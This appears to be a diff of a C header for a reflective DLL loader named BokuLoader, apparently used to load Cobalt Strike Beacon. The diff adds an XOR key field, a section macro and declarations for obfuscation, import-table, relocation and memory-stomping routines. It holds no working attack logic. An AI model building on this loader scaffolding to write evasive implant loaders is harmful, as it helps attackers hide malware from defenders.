@@ -1,7 +1,7 @@
 #define WIN32_LEAN_AND_MEAN
 #include <windows.h>
 #define STATUS_SUCCESS 0x0
-#define XORKEY 0xC3
+#define SECTION( x )    __attribute__(( section( ".text$" #x ) ))
 
 typedef struct Export {
     void *   Directory;
@@ -27,6 +27,7 @@ typedef struct Dll {
     unsigned int TextSectionSize;
     Export Export;
     unsigned __int64 obfuscate;
+    unsigned char xor_key;
 }Dll, *PDll;
 
 typedef struct Section {
@@ -275,6 +276,8 @@ typedef enum _MEMORY_INFORMATION_CLASS {
 } MEMORY_INFORMATION_CLASS;
 
 
+void * BokuLoader();
+void checkObfuscate(Dll * raw_beacon_dll_struct);
 void checkUseRWX(Dll * raw_beacon_dll_struct);
 void * returnRDI();
 void * getPEB();
@@ -359,6 +362,11 @@ typedef struct APIS{
     void* pNtFreeVirtualMemory;
 }APIS;
 
+void getApis(APIS * api);
+void doSections(Dll * virtual_beacon_dll, Dll * raw_beacon_dll);
+void doImportTable(APIS * api, Dll * virtual_beacon_dll, Dll * raw_beacon_dll);
+void doRelocations(APIS * api, Dll * virtual_beacon_dll, Dll * raw_beacon_dll);
+void stomp(unsigned __int64 length, unsigned char * buff);
 typedef void*  (WINAPI * DLLMAIN)        (HINSTANCE, unsigned int, void *);
 
 #define NtCurrentProcess() ( (void *)(LONG_PTR) -1 )
